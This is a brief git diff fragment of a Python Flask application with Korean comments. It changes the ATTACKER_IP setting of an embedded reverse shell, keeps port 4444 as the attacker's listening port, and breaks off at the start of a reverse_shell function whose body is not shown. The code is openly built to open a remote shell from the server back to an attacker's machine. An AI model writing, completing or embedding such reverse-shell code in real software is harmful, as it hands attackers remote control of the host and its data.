@@ -6,7 +6,7 @@ import threading
 app = Flask(__name__)
 
 # Reverse Shell 설정
-ATTACKER_IP = "192.168.1.200"  # 공격자의 IP 입력
+ATTACKER_IP = "192.168.1.206"  # 공격자의 IP 입력
 ATTACKER_PORT = 4444  # 공격자의 리버스 쉘 리스닝 포트
 
 def reverse_shell():
